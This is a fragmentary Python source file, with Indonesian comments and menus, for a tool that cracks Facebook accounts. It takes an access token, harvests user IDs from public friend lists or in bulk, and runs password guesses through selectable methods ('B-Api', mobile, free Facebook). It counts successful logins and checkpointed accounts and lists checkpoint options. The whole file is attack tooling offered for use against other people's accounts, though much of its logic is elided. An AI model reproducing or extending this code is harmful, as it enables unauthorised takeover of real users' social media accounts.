...
def banner():
	clear()
	wel = '# SELAMAT DATANG DI TOOLS CRACK FB YANG BARU'
	wel2 = mark(wel, style='green')
	sol().print(wel2)
	au='   ••• Author : Aziz Udin ••• Github : Kang-Berontak ••• \n  _____   ______ _______ _______ _____ _     _ _______ \n |_____] |_____/ |______ |  |  |   |   |     | |  |  |   \n |       |    \_ |______ |  |  | __|__ |_____| |  |  | TAPI BOONG '                                             
...
def login_lagi():
	banner()
	sky = '# MASUKIN TOKEN LU'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='green')
	panda = input(x+'['+p+'•'+x+'] Malak Token : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# Login Sukses , Setor Token Dulu'
		suu = mark(sue, style='green')
		sol().print(suu, style='green')
		time.sleep(2.5)
		login()
	except KeyError:
		sue = '# Login Gagal , Token Lu Modkad'
...
def menu(my_name,my_id,my_birthday):
	...
	io = '\33[37;1m[01] Crack Dari Pertemanan Publik\n\33[37;1m[02] Crack Dari Akun Publik [ Massal ] \n\33[37;1m[03] Cek Hasil Crack\n\33[37;1m[04] Lihat Opsi Checkpoint\n\33[37;1m[00] Keluar'
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Tunggu Bang....')
		time.sleep(1)
		sw = '# LAH KENAPA KELUAR BANG'
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ingin Crack Berapa ID [ Maksimal 10 ID ]')
	try:
	...
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Crack ID Dari Teman')
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL %s ID , YANG TERKUMPUL'%(len(id))
	if len(id)==0:
...
def setting():
	...
	teks = '\33[37;1m[01] Crack Dari Akun Tertua [ Saran Doang ]\n\33[37;1m[02] Crack Dari Akun Termuda [ Boleh Di Coba ]\n\33[37;1m[03] Acak Urutan ID [ Terserah Lu Sih ]'
	...
	ioz = '\33[37;1m[01] Method B-Api [ Rawan Spam IP ]\n\33[37;1m[02] Method Mobile [ Saran Doang Sih ]\n\33[37;1m[03] Methode Free Facebook [ Ini Lambat Bego ]'
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Saran Doang Sih ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	sol().print(mark(tanya, style='yellow'))
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s •Sabar• %s/%s ••• OK:%s ••• CP:%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> Nice Akunya Tap Yes [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Nice Hore Akunya Tap Yes [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
